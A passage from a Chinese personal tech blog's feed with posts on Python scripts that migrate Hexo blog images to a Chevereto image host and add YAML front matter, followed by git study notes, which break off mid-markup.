        <content type="html"><![CDATA[<h2 id="前言"><a class="header-anchor" href="#前言"></a>前言</h2><p>这几天在重新弄博客，基本上已经完工了，但是博客的链接还是不够友好。</p><p>因为<code>hexo</code>中的链接默认是年月日划分的，这样对<code>SEO</code>很不友好，所以就顺便做了博客的<code>链接持久化</code>，主要是使用的<code>hexo-abbrlink</code>这个插件，方法百度一堆，这里不再赘述。</p><p>在这之前因为看教程说会和<code>hexo-asset-image</code>插件冲突，所以一步到位搭了个图床，用来存放我的博客图片，也避免了日后图片过多超过<code>github</code>限制的情况。</p><a id="more"></a><h2 id="准备工作"><a class="header-anchor" href="#准备工作"></a>准备工作</h2><p>图床应用我用的<code>chevereto</code>，搭建教程这里也不提了，按照教程一路下一步即可。</p><p>图床搭建好了，那么把之前存在本地的图片放上去就成了问题。一方面需要把文件传上去，另一方面还需要把原来文章中的图片引用链接改成图床的链接。我博客里文章不多，也就20多篇，但是图片可不算少，所以写了个脚本来完成这个工作。</p><p><code>chevereto</code>提供了上传图片的<code>API</code>，所以首先需要去<code>chevereto</code>的后台获取你的<code>APIKEY</code>，然后才能调用接口。</p><p>在<code>仪表盘</code>—&gt;<code>设置</code>—&gt;<code>API</code>菜单下就可以看到了。</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/2020-02-26_01-46.png" alt="2020-02-26_01-46.png"></p><p>然后就可以写代码了。</p><hr><h2 id="基本思路"><a class="header-anchor" href="#基本思路"></a>基本思路</h2><p>基本思路是打开本地的<code>markdown</code>文件，然后正则获取其中引用的本地的图片路径，并将对应的文件通过<code>API</code>传到图床，然后把返回的图片链接替换回去即可。流程图如下:</p><p><img src="http://sz.guiu.xyz/images/2020/02/25/image.png" alt="流程图"></p><hr><h2 id="代码实现"><a class="header-anchor" href="#代码实现"></a>代码实现</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># author: guiu</span></span><br><span class="line"><span class="comment"># data: 2020.2.25</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> mimetypes</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PixMv</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># 初始化一些用到的变量</span></span><br><span class="line">        self.root = os.path.dirname(os.path.abspath(__file__))  <span class="comment"># 工作目录</span></span><br><span class="line">        self.md_list = []  <span class="comment"># 当前目录下的文章列表</span></span><br><span class="line">        self.error_url = &#123;&#125;     <span class="comment"># 上传失败的链接</span></span><br><span class="line">        self.current_filename = <span class="string">""</span></span><br><span class="line">        self.current_error_link = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">list_md_file</span><span class="params">(self, path)</span>:</span></span><br><span class="line">        <span class="comment"># 搜寻当前目录下的md文件，方便后续修改(搜索深度只有一级)</span></span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> os.listdir(path):</span><br><span class="line">            <span class="keyword">if</span> file[<span class="number">-3</span>:] <span class="keyword">in</span> [<span class="string">".md"</span>, <span class="string">".MD"</span>]:</span><br><span class="line">                self.md_list.append(file)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">modify_md_file</span><span class="params">(self, md_list)</span>:</span></span><br><span class="line">        <span class="comment"># 对self.md_list中的文件进行修改,将本地引用的图片链接转成图床链接</span></span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> md_list:</span><br><span class="line">            <span class="comment"># 记录当前文件名</span></span><br><span class="line">            self.current_filename = file</span><br><span class="line">            <span class="keyword">with</span> open(os.path.join(self.root, file), <span class="string">"r+"</span>, encoding=<span class="string">'utf8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                file_content = f.read()</span><br><span class="line">                <span class="comment"># 每个文件都建立一个错误列表，存放失败的链接</span></span><br><span class="line">                self.current_error_link = []</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="comment"># 正则匹配提取本地图片引用路径,传给modify_url函数修改后替换</span></span><br><span class="line">                    file_content = re.sub(<span class="string">r"\!\[.*?\]\((?!http:|data:).*?\)"</span>, self.modify_url,</span><br><span class="line">                                          file_content, count=<span class="number">0</span>, flags=<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    print(<span class="string">"&#123;&#125; modify failed."</span>.format(self.current_filename))</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="comment"># 移动文件指针到开头</span></span><br><span class="line">                f.seek(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">                <span class="comment"># 覆盖写入修改后的内容</span></span><br><span class="line">                f.write(file_content)</span><br><span class="line">                print(<span class="string">"&#123;&#125; modify succeeded."</span>.format(self.current_filename))</span><br><span class="line">        <span class="comment"># 生成日志文件,记录失败的链接</span></span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">"modify.log"</span>, <span class="string">'r+'</span>) <span class="keyword">as</span> log:</span><br><span class="line">            log.write(str(self.error_url))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">modify_url</span><span class="params">(self, url_match)</span>:</span></span><br><span class="line">        <span class="comment"># 将正则匹配到的路径上传至图床,并把图床链接替换回去</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 提取图片路径</span></span><br><span class="line">            img_path = re.findall(<span class="string">r"\.\/(.*?)\)"</span>, url_match.group())[<span class="number">0</span>]</span><br><span class="line">            resjson = self.up_to_chevereto(img_path)</span><br><span class="line">            <span class="comment"># 对获取到的图床链接进行处理</span></span><br><span class="line">            replaced_url = self.parse_response_url(resjson, img_path)</span><br><span class="line">            <span class="keyword">return</span> replaced_url</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="comment"># 错误的话就存起来，然后不修改</span></span><br><span class="line">            self.current_error_link = url_match.group()</span><br><span class="line">            self.error_url[self.current_filename] = self.current_error_link</span><br><span class="line">            <span class="keyword">return</span> url_match.group()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_response_url</span><span class="params">(self, json, img_path)</span>:</span></span><br><span class="line">        <span class="comment"># 从返回的json中解析字段</span></span><br><span class="line">        <span class="keyword">if</span> json[<span class="string">'status_code'</span>] != <span class="number">200</span>:</span><br><span class="line">            print(<span class="string">"&#123;&#125;\tweb端返回失败,可能是APIKey不对. status_code &#123;&#125; ."</span>.format(</span><br><span class="line">                img_path, json[<span class="string">'status_code'</span>])</span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">"上传成功了但是状态码不对,请手动核对"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            img_url = json[<span class="string">"image"</span>][<span class="string">"url"</span>]</span><br><span class="line">            filename = json[<span class="string">"image"</span>][<span class="string">"filename"</span>]</span><br><span class="line">            print(filename + <span class="string">"\t上传图床成功"</span>)</span><br><span class="line">            replace_url = <span class="string">"![&#123;&#125;](&#123;&#125;)"</span>.format(filename, img_url)</span><br><span class="line">            <span class="keyword">return</span> replace_url</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">up_to_chevereto</span><span class="params">(self, file)</span>:</span></span><br><span class="line">        <span class="comment"># 获得本地图片路径后，上传至图床并记录返回的json字段</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res_json = self.upload(self.formatSource(file))</span><br><span class="line">            <span class="keyword">return</span> res_json</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(file+<span class="string">"\t上传失败"</span>)</span><br><span class="line">            <span class="comment"># 失败的话就抛一个异常</span></span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">"上传失败"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">(self, files)</span>:</span></span><br><span class="line">        <span class="comment"># 图床api</span></span><br><span class="line">        APIKey = <span class="string">"THERE PUT YOUR APIKEY"</span></span><br><span class="line">        format_str = <span class="string">"json"</span></span><br><span class="line">        url = <span class="string">"http://your_website/api/1/upload/?key="</span> + \</span><br><span class="line">            APIKey + <span class="string">"&amp;format="</span> + format_str  <span class="comment"># 图床地址</span></span><br><span class="line">        r = requests.post(url, files=files)</span><br><span class="line">        <span class="keyword">return</span> json.loads(r.text)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">formatSource</span><span class="params">(self, filename)</span>:</span></span><br><span class="line">        imageList = []</span><br><span class="line">        mime_type = mimetypes.guess_type(filename)[<span class="number">0</span>]</span><br><span class="line">        imageList.append(</span><br><span class="line">            (<span class="string">'source'</span>, (filename, open(filename, <span class="string">'rb'</span>), mime_type))</span><br><span class="line">        )</span><br><span class="line">        <span class="comment">#print (imageList)</span></span><br><span class="line">        <span class="keyword">return</span> imageList</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    p = PixMv()</span><br><span class="line">    p.list_md_file(p.root)</span><br><span class="line">    p.modify_md_file(p.md_list)</span><br></pre></td></tr></table></figure><p>将脚本放在<code>/yourblog/source/_post/</code>文件夹下运行即可。</p>]]></content>
      
      
      <categories>
          
          <category> 折腾纪实 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> Hexo </tag>
            
            <tag> chevereto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python实现批量往hexo文章添加YAML头</title>
      <link href="/p/3585c4c0.html"/>
      <url>/p/3585c4c0.html</url>
      
        <content type="html"><![CDATA[<p>最近在<code>kali</code>用的比较多，于是想把<code>Hexo</code>也迁移过来，所以进行了一些工作，但是等到迁移完成之后，编译的时候就傻眼了，时间全乱了……</p><p>原本的文章发布时间全都看不到了，变成了执行<code>hexo g</code>命令的时间。</p><p>于是到处去寻找解决办法，发现原来是<code>YAML</code>文件头的问题。</p><p>因为之前写博客都是在<code>windows</code>下，所以开新文档的时候基本上没有使用<code>hexo</code>的<code>hexo new</code>命令，都是用<code>typora</code>新开一个文档就开始弄，然后手动创建一个文件夹存放图片等依赖文件，只有生成静态页面和发布的时候才用到了<code>hexo</code>的命令。</p><p>而用<code>hexo new</code>生成新文章的时候，<code>hexo</code>会自动创建同名文件夹用来存放图片，并在文章对应的<code>markdown</code>文件开头添加<code>YAML</code>信息，包括了文章的<code>title</code>，发布时间，<code>tags</code>等一些信息，而生成静态文件的时候，文章的发布日期就是在<code>YAML</code>头部信息中获取的。</p><p>平时我写文档的时候，都是手动指定<code>title</code>，所以<code>markdown</code>文件的<code>YAML</code>头部信息中就只有<code>title</code>，没有其他信息。</p><p>在生成静态文件的时候，如果没有指定发布日期，那么<code>hexo</code>会把文件的修改时间当成发布时间。</p><p>然而当我们迁移了目录之后，文件的修改时间被改变了，所以生成的时候，导致发布时间全都变成了最后的修改时间。</p><a id="more"></a><p>那么解决办法也很简单，手动将发布时间写入<code>YAML</code>头部信息即可。但是文件太多了，手动修改太麻烦，于是我写了个脚本来解决。</p><p>由于<code>markdown</code>文件本身是文本文件，所以本质上是将特定格式的字符串写入文件开头。</p><p><code>python</code>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 更新hexo博客文章的文件头，批量增加信息</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">insert_info</span><span class="params">(old, file_name, file_data)</span>:</span></span><br><span class="line">    new_info = [<span class="string">"---\n"</span>]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> old[<span class="string">"title"</span>]:</span><br><span class="line">            new_info.append(<span class="string">"title: &#123;&#125;\n"</span>.format(old[<span class="string">"title"</span>]))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        new_info.append(<span class="string">"title: &#123;&#125;\n"</span>.format(file_name))</span><br><span class="line">    new_info.append(<span class="string">"date: &#123;&#125;\n"</span>.format(file_data)) </span><br><span class="line">    new_info.append(<span class="string">"categories: \n"</span>)</span><br><span class="line">    new_info.append(<span class="string">"tags: \n"</span>)</span><br><span class="line">    new_info.append(<span class="string">"---\n"</span>)</span><br><span class="line">    <span class="keyword">return</span> new_info</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modify_md_content</span><span class="params">(top)</span>:</span></span><br><span class="line">    info_columns = [<span class="string">"title"</span>, <span class="string">"date"</span>, <span class="string">"categories"</span>, <span class="string">"tags"</span>]</span><br><span class="line">    <span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(top, topdown=<span class="literal">False</span>):</span><br><span class="line">        <span class="comment"># 循环文件</span></span><br><span class="line">        <span class="keyword">for</span> file_name <span class="keyword">in</span> files:</span><br><span class="line">            file_name_split = file_name.split(<span class="string">'.'</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> file_name_split[<span class="number">-1</span>] == <span class="string">'md'</span>:</span><br><span class="line">                    <span class="comment"># 找到md文件并且复制md文件路径</span></span><br><span class="line">                    md_file_path = os.path.join(root, <span class="string">'.'</span>.join(file_name_split))</span><br><span class="line">                    <span class="comment"># 添加字典存放yaml信息</span></span><br><span class="line">                    yaml_info = &#123;&#125;</span><br><span class="line">                    <span class="comment"># 打开md文件然后进行替换</span></span><br><span class="line">                    <span class="keyword">with</span> open(md_file_path, <span class="string">'r'</span>, encoding=<span class="string">'utf8'</span>) <span class="keyword">as</span> fr:</span><br><span class="line">                        <span class="comment"># 按行读取md文件</span></span><br><span class="line">                        data = fr.readlines()</span><br><span class="line">                        <span class="comment"># 此时说明有文章信息                            </span></span><br><span class="line">                        <span class="keyword">if</span> <span class="string">"---"</span> <span class="keyword">in</span> data[<span class="number">0</span>]:</span><br><span class="line">                            <span class="keyword">for</span> i,line <span class="keyword">in</span> enumerate(data[<span class="number">1</span>:]):</span><br><span class="line">                                <span class="comment"># 直到下一个---时退出</span></span><br><span class="line">                                <span class="keyword">if</span> <span class="string">"---"</span> <span class="keyword">in</span> line:</span><br><span class="line">                                    index = i + <span class="number">1</span></span><br><span class="line">                                    <span class="keyword">break</span></span><br><span class="line">                                <span class="keyword">else</span>:</span><br><span class="line">                                    index = <span class="number">0</span></span><br><span class="line">                                <span class="comment"># 从yaml头中解析title等字段并保存</span></span><br><span class="line">                                tmp = line.replace(<span class="string">" "</span>, <span class="string">""</span>).replace(<span class="string">"\n"</span>, <span class="string">""</span>).split(<span class="string">":"</span>)</span><br><span class="line">                                yaml_info[tmp[<span class="number">0</span>]] = tmp[<span class="number">1</span>]</span><br><span class="line">                        <span class="comment"># 获取文件修改时间</span></span><br><span class="line">                        time_array = time.localtime(os.path.getmtime(file_name))</span><br><span class="line">                        update_time = time.strftime(<span class="string">"%Y-%m-%d %H:%M:%S"</span>, time_array)</span><br><span class="line">                        <span class="comment"># 生成新的YAML头</span></span><br><span class="line">                        data_inser = insert_info(yaml_info, file_name_split[<span class="number">0</span>], update_time)</span><br><span class="line">                        <span class="comment"># 修改YAML头</span></span><br><span class="line">                        data = data_inser + data[index+<span class="number">1</span>:]</span><br><span class="line">                        </span><br><span class="line">                        print(data_inser)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">with</span> open(md_file_path, <span class="string">'w'</span>, encoding=<span class="string">'utf8'</span>) <span class="keyword">as</span> fr:</span><br><span class="line">                        <span class="keyword">for</span> line <span class="keyword">in</span> data:</span><br><span class="line">                            fr.write(line)</span><br><span class="line">                            </span><br><span class="line">            <span class="keyword">except</span> FileNotFoundError <span class="keyword">as</span> e:</span><br><span class="line">                print(e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    top = <span class="string">r'./'</span></span><br><span class="line">    modify_md_content(top)</span><br></pre></td></tr></table></figure><p>然后将脚本放到<code>/blog/source/_posts </code>文件夹下运行即可。</p>]]></content>
      
      
      <categories>
          
          <category> 折腾纪实 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git 学习笔记</title>
      <link href="/p/2b03a009.html"/>
      <url>/p/2b03a009.html</url>
      
        <content type="html"><![CDATA[<p>这个文件是学习git操作的主要改动目标，我会在这里记录我的学习笔记，顺便用这个文件的改动过程来记录git的各项操作。</p><p>以下内容是我在廖雪峰官网上学习<a href="https://www.liaoxuefeng.com/wiki/896043488029600" target="_blank" rel="noopener">git教程 </a>的相关笔记，部分内容也来自该网站，此处只做记录。</p><hr><a id="more"></a><p>每次改动后，都要：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git add</span><br><span class="line">git commit</span><br></pre></td></tr></table></figure><h2 id="版本回退"><a class="header-anchor" href="#版本回退"></a>版本回退</h2><p>Git中，一次<code>commit</code>就是一次快照，会分配一个唯一的commit id</p><p>要回退之前的版本，用到的命令是<code>git reset</code>。</p><p>在Git中，用<code>HEAD</code>表示当前版本，上一个版本就是<code>HEAD^</code>，上上一个版本就是<code>HEAD^^</code>，当然往上100个版本写100个<code>^</code>比较容易数不过来，所以写成<code>HEAD~100</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard HEAD^# 回退上一个版本</span><br><span class="line">git reset --hard 1094a# 回退（指向）到commit id为1094a...的版本</span><br></pre></td></tr></table></figure><p><code>git log</code>：Git中查看历史提交记录（逻辑上的时间线，回退之后就看不到 ’未来‘ 的版本记录了）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">commit 591c501066e6027a4226d178e562b2a95bf20f47 (HEAD -&gt; master)</span><br><span class="line">Author: guiu &lt;hcl01125@gmail.com&gt;</span><br><span class="line">Date:   Fri Feb 21 01:16:27 2020 +0800</span><br><span class="line"></span><br><span class="line">    修改markdown格式错误，以后改动就用typora来做。</span><br><span class="line"></span><br><span class="line">commit 7a8d5987913278682362982e1adff747de0f0ecf</span><br><span class="line">Author: guiu &lt;hcl01125@gmail.com&gt;</span><br><span class="line">Date:   Fri Feb 21 01:12:11 2020 +0800</span><br><span class="line"></span><br><span class="line">    创建一个学习笔记文件，一边学习一边写笔记</span><br><span class="line"></span><br><span class="line">commit 950da97867e275f166a5f37cf9484d4b45e5b986</span><br><span class="line">Author: guiu &lt;hcl01125@gmail.com&gt;</span><br><span class="line">Date:   Fri Feb 21 01:06:02 2020 +0800</span><br><span class="line"></span><br><span class="line">    the first change</span><br><span class="line"></span><br><span class="line">commit 67979fd8ea9695d9a3972e9299466e8395faf3b5</span><br><span class="line">Author: guiu &lt;hcl01125@gmail.com&gt;</span><br><span class="line">Date:   Fri Feb 21 01:01:47 2020 +0800</span><br><span class="line"></span><br><span class="line">    添加主要改动对象---demo.txt</span><br></pre></td></tr></table></figure><p><code>git reflog</code>：Git中查看历史命令（实际操作的时间线，回退的记录也会在里面）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">91c501 (HEAD -&gt; master) HEAD@&#123;0&#125;: reset: moving to HEAD^</span><br><span class="line">68cede9 HEAD@&#123;1&#125;: commit: 这一次模拟误操作切提交了的情况</span><br><span class="line">591c501 (HEAD -&gt; master) HEAD@&#123;2&#125;: commit: 修改markdown格式错误，以后改动就用typora来做。</span><br><span class="line">7a8d598 HEAD@&#123;3&#125;: commit: 创建一个学习笔记文件，一边学习一边写笔记</span><br><span class="line">950da97 HEAD@&#123;4&#125;: commit: the first change</span><br><span class="line">67979fd HEAD@&#123;5&#125;: commit: 添加主要改动对象---demo.txt</span><br><span class="line">e5c14e1 HEAD@&#123;6&#125;: commit: 原来删除文件也是要git rm 的</span><br><span class="line">0f8acc5 HEAD@&#123;7&#125;: commit (amend): add the first version repo</span><br><span class="line">270c15c HEAD@&#123;8&#125;: commit: add the first version repo</span><br><span class="line">fa98849 HEAD@&#123;9&#125;: commit (initial): wrote a reademe file.</span><br></pre></td></tr></table></figure><h2 id="工作区和暂存区"><a class="header-anchor" href="#工作区和暂存区"></a>工作区和暂存区</h2><h3 id="工作区"><a class="header-anchor" href="#工作区"></a>工作区</h3><p>就是当前git仓库的目录，<code>git init</code>命令执行的时候定义的目录，及其子目录。</p><h3 id="暂存区"><a class="header-anchor" href="#暂存区"></a>暂存区</h3><p>当我们改动完成后，执行<code>git add xxx</code>的过程，就是把改动添加到暂存区的过程。</p><p><code>git commit</code>的过程，可以看做是对当前工作区做了一个快照，实际上是将暂存的内容都提交到当前分支的过程。</p><blockquote><p><code>git commit</code>执行完成后，对Git来说，我们的一次修改才算完成。我们创建Git版本库时，Git自动为我们创建了唯一一个<code>master</code>分支，所以，<code>git commit</code>就是往<code>master</code>分支上提交更改。</p></blockquote><p>或者说，需要提交的文件修改通通放到暂存区，然后，一次性提交暂存区的所有修改。</p><h2 id="Git修改的概念"><a class="header-anchor" href="#Git修改的概念"></a>Git修改的概念</h2><p>Git管理的是每一次的修改，举个栗子，流程如下：</p><p><code>change1</code> --&gt; <code>git add</code>  # 记录<code>change1</code>并放暂存区</p><p><code>change2</code> --&gt; <code>git commit</code># 此时<code>change2</code>并没有被存放到暂存区，提交的只是<code>change1</code></p><p>两次修改都完成了，但是因为暂存中只有<code>change1</code>，所以提交的时候会只提交暂存区中的内容，<code>change2</code>的改动也会被检测到，要想提交<code>change2</code>的改动，只需要<code>git add xxx</code> ，然后<code>git commit</code>即可。</p><p>如果不想提交的那么频繁，可以先<code>git add</code>多次，然后合并一起<code>git commit</code>。合并提交时，同一个文件的多次改动也会被合并为同一个修改。</p><p><strong>两次<code>git add</code> 之间的改动才会被记录为一次修改。</strong></p><p>同理，你不<code>git add</code>，那么commit的时候就不会被记录到分支中。</p><h2 id="撤销修改"><a class="header-anchor" href="#撤销修改"></a>撤销修改</h2><p><code>git checkout -- file</code>：这个命令可以丢弃工作区的更改，使文件回退到最近一次<code>commit</code>或最近一次<code>add</code>的状态。</p><p>比如当前文件已经修改并且add了之后，再次进行了错误的修改，<strong>并且没有add</strong>，那么我们可以使用</p><p><code>git checkout -- file</code>命令来丢弃当前工作区中已保存但没有<code>git add</code>的改动，使之回退到最后一次<code>add</code>的状态。</p><p>在<code>git 2.23</code>以后，git checkout被拆分成了两个命令：<code>git switch</code> 和<code>git restore</code></p><blockquote><p>git checkout 这个命令承担了太多职责，既被用来切换分支，又被用来恢复工作区文件，对用户造成了很大的认知负担。<br>于是，在 Git 2.23 里，这个命令被拆分成了两个新命令：git switch 和 git restore</p></blockquote><h2 id="远程仓库推送"><a class="header-anchor" href="#远程仓库推送"></a>远程仓库推送</h2><p>github注册及创建仓库的部分不再赘述。</p><h3 id="添加远程仓库关联："><a class="header-anchor" href="#添加远程仓库关联："></a>添加远程仓库关联：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote add origin git@github.com:hcl01125&#x2F;learngit.git</span><br></pre></td></tr></table></figure><p>把本地仓库推送到远程库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure><p>这样就把本地的master分支推送到了远程origin仓库的master分支。</p><blockquote><p>由于远程库是空的，我们第一次推送<code>master</code>分支时，加上了<code>-u</code>参数，Git不但会把本地的<code>master</code>分支内容推送的远程新的<code>master</code>分支，还会把本地的<code>master</code>分支和远程的<code>master</code>分支关联起来，在以后的推送或者拉取时就可以简化命令。</p></blockquote><p><strong>一点小意外：</strong></p><p>由于之前定义git工作目录的时候，直接把练习<code>java</code>的文件夹当成了工作目录，没注意里面有个之前编译的<code>aria2c</code>的二进制文件，比较大，有100多M，所以<code>git push</code>的时候就失败了，提示超过100M限制。</p><p>解决办法：</p><p>先删除文件<code>aria2c</code>，然后将提交记录中<code>aria2c</code>的部分删掉即可，此操作不影响工作区内容，也不影响其余文件的<code>commit</code>记录。</p><figure class="highlight shell"><table><tr><td 